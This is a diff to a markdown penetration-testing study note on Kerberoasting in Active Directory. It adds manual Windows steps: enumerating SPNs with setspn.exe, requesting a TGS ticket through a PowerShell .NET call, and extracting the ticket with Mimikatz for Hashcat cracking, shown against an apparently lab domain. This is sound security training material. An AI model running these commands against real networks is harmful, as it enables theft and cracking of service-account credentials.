@@ -25,7 +25,7 @@ The attack can be performed from multiple places:
 - As `SYSTEM` on a domain-joined Windows host
 - From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) `/netonly`
 
-### Kerberoasting with GetUserSPNs.py
+### Kerberoasting with GetUserSPNs.py - Linux
 `GetUserSPNs.py` is an [impacket toolkit](https://github.com/SecureAuthCorp/impacket) script for working with SPNs.
 #### Request TGS tickets for SPN accounts
 ```bash
@@ -38,5 +38,27 @@ GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request-user [target-user]
 > The output will be in format for [[Hashcat]] - mode: 13100
 > We can then use a tool like [[CrackMapExec]] to validate the account credentials once cracked.
 
+### Manual Kerberoasting with setspn.exe - Windows
+Before modern automated tools existed, manual methods such as using the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) was the way this attack was performed.
+The general methodology is to extract a bunch of SPNs, then request TGS tickets and have them loaded into memory. Finally, we can then use a tool like [[Mimikatz]] to extract them from memory.
+#### Enumerate SPNs
+```batch
+setspn.exe -Q */*
 
+:: Example Output
+CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+> This will return not only users, but computers too. You may want to only focus on users.
 
+#### Targeting a single user
+```PowerShell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+The general concept here is:
+1. The `Add-Type` cmdlet allows us to use `.NET` classes
+2. The `-AssemblyName` allows us to specify the assembly with the types we need
+3. [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is the namespace that contains the classes relating to building security token services
+4. `New-Object` creates a new `.NET` object
+5. Using the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class creates a security token for the passed SPN name
